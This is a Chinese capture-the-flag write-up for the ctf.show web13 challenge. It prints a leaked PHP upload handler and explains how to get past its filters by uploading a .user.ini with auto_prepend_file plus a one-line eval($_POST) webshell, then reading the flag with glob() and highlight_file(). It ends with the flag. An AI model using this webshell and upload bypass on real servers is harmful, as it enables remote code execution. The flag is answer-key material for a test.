存在upload.php.bak文件，可以看到上传文件的源码：

```php
<?php 
	header("content-type:text/html;charset=utf-8");
	$filename = $_FILES['file']['name'];
	$temp_name = $_FILES['file']['tmp_name'];
	$size = $_FILES['file']['size'];
	$error = $_FILES['file']['error'];
	$arr = pathinfo($filename);
	$ext_suffix = $arr['extension'];
	if ($size > 24){
		die("error file zise");
	}
	if (strlen($filename)>9){
		die("error file name");
	}
	if(strlen($ext_suffix)>3){
		die("error suffix");
	}
	if(preg_match("/php/i",$ext_suffix)){
		die("error suffix");
    }
    if(preg_match("/php/i"),$filename)){
        die("error file name");
    }
	if (move_uploaded_file($temp_name, './'.$filename)){
		echo "文件上传成功！";
	}else{
		echo "文件上传失败！";
	}

 ?>
```

根据源码分析，上传的文件大小要小于等于24，因此文件只能是`<?php eval($_POST['a']);`，但是文件是php结尾的文件，用一种特殊的手法来绕过。

对于php中的.user.ini有如下解释：
PHP 会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP 不会搜寻。也就是在.user.ini中如果设置了文件名，那么任意一个页面都会将该文件中的内容包含进去。
我们在.user.ini中输入auto_prepend_file =a.txt，这样在该目录下的所有文件都会包含a.txt的内容、

但是菜刀连接上之后我们发现没有对文件操作的权限，所以我们直接在网页上查找flag。

使用glob()函数查看文件，发现存在一个php文件

![image-20210814214349914](E:\my_ctf_learning\writeup\Web\ctf.show_web13\images\image-20210814214349914.png)

```
903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php。
```

使用highlight_file()函数查看源码，得到flag：

![image-20210814214502670](E:\my_ctf_learning\writeup\Web\ctf.show_web13\images\image-20210814214502670.png)

```
ctfshow{191bc1d7-159f-4e59-9db3-4ca2a7c4e3ba}
```



